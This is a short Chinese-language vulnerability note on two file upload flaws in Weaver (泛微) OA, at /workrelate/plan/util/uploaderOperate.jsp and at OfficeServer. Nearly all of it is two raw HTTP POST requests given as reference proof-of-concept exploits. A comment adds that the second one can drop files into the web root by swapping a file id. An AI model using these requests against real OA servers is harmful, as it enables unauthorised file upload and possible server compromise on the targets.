## 泛微 OA 文件上传

```
漏洞等级：严重
漏洞详情：/workrelate/plan/util/uploaderOperate.jsp 存在文件上传漏洞
```

> 参考POC
```text
POST /workrelate/plan/util/uploaderOperate.jsp HTTP/1.1
Host: X.X.X.X
Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="101", "Google Chrome";v="101"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like
Gecko) Chrome/101.0.4951.64 Safari/537.36
Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/
*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarymVk33liI64J7GQaK
Content-Length: 393
------WebKitFormBoundarymVk33liI64J7GQaK
Content-Disposition: form-data; name="secId"
1
------WebKitFormBoundarymVk33liI64J7GQaK
Content-Disposition: form-data; name="Filedata"; filename="testlog.txt"
Test
------WebKitFormBoundarymVk33liI64J7GQaK
Content-Disposition: form-data; name="plandetailid"
1
------WebKitFormBoundarymVk33liI64J7GQaK— 
```

```
泛微OA /defaultroot/officeserverservlet ：确认为历史漏洞；
详情：/officeserverservlet 路径文件上传
```

> 将文件释放至跟网站根路径下 在数据包中将 fileid 替换
```
POST /OfficeServer HTTP/1.1
Host: X.X.X.X
Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="101", "Google Chrome";v="101"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like
Gecko) Chrome/101.0.4951.64 Safari/537.36
Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/
*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarymVk33liI64J7GQaK
Content-Length: 207
------WebKitFormBoundarymVk33liI64J7GQaK
Content-Disposition: form-data; name="aaa"
{'OPTION':'INSERTIMAGE','isInsertImageNew':'1','imagefileid4pic':'20462'}
------WebKitFormBoundarymVk33liI64J7GQaK—
```
